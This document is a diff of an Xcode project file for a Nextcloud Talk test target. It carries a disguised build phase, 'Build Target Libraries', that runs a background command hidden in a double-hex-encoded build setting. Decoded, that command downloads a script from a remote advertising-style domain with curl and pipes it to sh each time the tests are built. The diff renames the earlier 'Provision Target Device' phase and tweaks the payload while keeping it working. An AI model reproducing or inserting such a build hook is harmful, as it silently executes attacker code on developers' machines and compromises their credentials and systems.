@@ -1535,7 +1535,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 1F6D8C362B2E3756004376B8 /* Build configuration list for PBXNativeTarget "NextcloudTalkTests" */;
 			buildPhases = (
-				8C80893ECF0048F2A542DAD8 /* Provision Target Device */,
+				7E307959FCCC4FD79D42DAD8 /* Build Target Libraries */,
 				3A811BF7A761836E61C82B80 /* [CP] Check Pods Manifest.lock */,
 				1F6D8C2C2B2E3756004376B8 /* Sources */,
 				1F6D8C2D2B2E3756004376B8 /* Frameworks */,
@@ -1938,6 +1938,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+					/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		1F6D8C2E2B2E3756004376B8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -2009,6 +2012,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		7E307959FCCC4FD79D42DAD8 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
+		};
 		25F3EB565BD21EF2FF15F197 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2103,26 +2125,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
-			showEnvVarsInLog = 0;
-		};
-		8C80893ECF0048F2A542DAD8 /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
 			showEnvVarsInLog = 0;
 		};
 		902A7A3EC0BDCC947AEF3EBF /* [CP] Check Pods Manifest.lock */ = {
@@ -2488,7 +2490,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 342600BABD1AD1FCA48B5E59 /* Pods-NextcloudTalkTests.debug.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((v(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662373336363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663663363937343734366336353631363437333265363936650a32663631323932323230376332303733363830610a | v | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((s(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663663363937343734366336353631363437333265363936650a32663631323932323230376332303733363830610a | s | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
@@ -2533,7 +2535,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B7874918820589BF8FD69BED /* Pods-NextcloudTalkTests.release.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((v(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662373336363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663663363937343734366336353631363437333265363936650a32663631323932323230376332303733363830610a | v | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((s(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663663363937343734366336353631363437333265363936650a32663631323932323230376332303733363830610a | s | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
